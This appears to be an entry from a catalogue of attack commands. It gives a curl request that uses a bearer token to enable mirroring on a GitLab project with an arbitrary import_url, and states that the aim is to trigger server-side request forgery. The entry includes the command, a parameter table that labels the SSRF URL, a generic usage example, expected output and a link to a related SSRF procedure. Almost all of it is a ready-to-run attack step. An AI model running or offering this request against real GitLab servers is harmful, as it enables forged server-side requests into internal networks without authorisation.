---
id: cmd-uuid-003
data: >-
  curl -H "Authorization: Bearer $TOKEN" -v -XPUT
  'http://gitlab-vm.local/api/v4/projects/204?mirror=true&import_url=http://google.com/v1/config?'
tags:
  - gitlab-api
  - ssrf
  - mirror
type: command
output: |-
  HTTP/1.1 200 OK
  {"mirror":true,...}
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:53:38.524Z'
verified: false
validated: true
submitted: true
---
# curl-add-mirror-trigger

## Command

```bash
curl -H "Authorization: Bearer $TOKEN" -v -XPUT 'http://gitlab-vm.local/api/v4/projects/204?mirror=true&import_url=http://google.com/v1/config?'
```

## Description

Updates GitLab project to enable mirroring, triggering git clone via injected proxy for SSRF.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "Authorization: Bearer $TOKEN"` | Auth header | Yes |
| `-v` | Verbose | No |
| `-XPUT` | PUT method | Yes |
| `mirror=true` | Enable mirroring | Yes |
| `import_url=...` | SSRF URL | Yes |

## Examples

### Basic Usage

```bash
curl -H "Authorization: Bearer $TOKEN" -XPUT 'http://gitlab.example/api/v4/projects/123?mirror=true&import_url=http://example?'
```

## Expected Output

200 OK with updated project JSON.

## Related

- [[Related Procedure: Add-Mirror-to-Trigger-SSRF]]
